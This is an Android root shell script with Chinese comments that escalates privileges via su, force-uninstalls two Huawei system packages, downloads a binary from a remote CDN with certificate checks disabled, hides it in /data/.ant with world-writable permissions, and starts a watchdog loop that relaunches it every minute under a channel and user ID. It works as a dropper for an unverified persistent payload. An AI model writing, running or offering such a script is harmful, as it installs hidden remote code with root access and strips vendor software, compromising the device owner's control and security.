#!/system/bin/sh

# --- 1. 自动提权 ---
if [ "$(id -u)" != "0" ]; then
    echo "正在请求 Root 权限..."
    exec su -c "sh \"$0\""
    exit $?
fi

echo "=== 状态: Root 已确认 ==="

# --- 2. 优先执行：删除目标 APP (新增逻辑) ---
echo "[1/4] 开始清理目标软件包..."
PKGS="com.huawei.mobileassistant com.huawei.apaas.koophone.casdk"

# 尝试重新挂载系统分区为读写（针对部分老旧机型物理删除有效）
mount -o remount,rw /system >/dev/null 2>&1

for pkg in $PKGS; do
    if pm list packages | grep -q "$pkg"; then
        echo "[!] 发现 $pkg，执行强制卸载..."
        # 1. 停止运行
        am force-stop "$pkg" >/dev/null 2>&1
        # 2. 清除数据
        pm clear "$pkg" >/dev/null 2>&1
        # 3. 针对主用户卸载
        pm uninstall --user 0 "$pkg" >/dev/null 2>&1
        # 4. 全局卸载
        pm uninstall "$pkg" >/dev/null 2>&1
        
        # 检查是否依然存在
        if ! pm list packages | grep -q "$pkg"; then
            echo "[+] $pkg 已成功移除。"
        else
            echo "[-] $pkg 无法卸载，尝试禁用..."
            pm disable-user "$pkg" >/dev/null 2>&1
        fi
    else
        echo "[*] 未发现 $pkg，跳过。"
    fi
done

# --- 3. 变量定义 ---
URL="https://download-cdn.niulinkcloud.com/init/android_up"
BIN_NAME="android_up"
TARGET_DIR="/data/.ant"
TARGET_PATH="$TARGET_DIR/$BIN_NAME"
DOWNLOAD_DIR="/storage/emulated/0/Download/Browser"

# --- 4. 文件部署 ---
if [ -f "$TARGET_PATH" ]; then
    echo "[2/4] 发现现有二进制文件，更新权限..."
    chmod 777 "$TARGET_PATH"
else
    echo "[2/4] 目标文件不存在，准备下载..."
    mkdir -p "$DOWNLOAD_DIR"
    cd "$DOWNLOAD_DIR" || exit 1
    
    rm -f "./$BIN_NAME"
    if ! curl -Lk -o "./$BIN_NAME" "$URL"; then
        wget --no-check-certificate -O "./$BIN_NAME" "$URL"
    fi

    if [ ! -f "./$BIN_NAME" ]; then
        echo "错误: 下载失败。"
        exit 1
    fi

    echo "[*] 迁移至隐藏目录 $TARGET_DIR ..."
    mkdir -p "$TARGET_DIR"
    mount -o remount,rw /data >/dev/null 2>&1
    cat "./$BIN_NAME" > "$TARGET_PATH"
    chmod 777 "$TARGET_PATH"
    rm -f "./$BIN_NAME"
fi

# --- 5. 进程刷新 ---
echo "[3/4] 正在清理旧进程..."
pkill -f "$BIN_NAME" >/dev/null 2>&1
sleep 1

# --- 6. 后台保活 (每分钟检查) ---
echo "[4/4] 启动后台守护逻辑..."

(
    while true
    do
        if ! pidof "$BIN_NAME" >/dev/null; then
            nohup "$TARGET_PATH" --channel ant --uid 89154 >/dev/null 2>&1 &
            if command -v disown >/dev/null; then
                disown
            fi
        fi
        sleep 60
    done
) &

echo "=== 脚本执行完毕，监控已转入后台 ==="
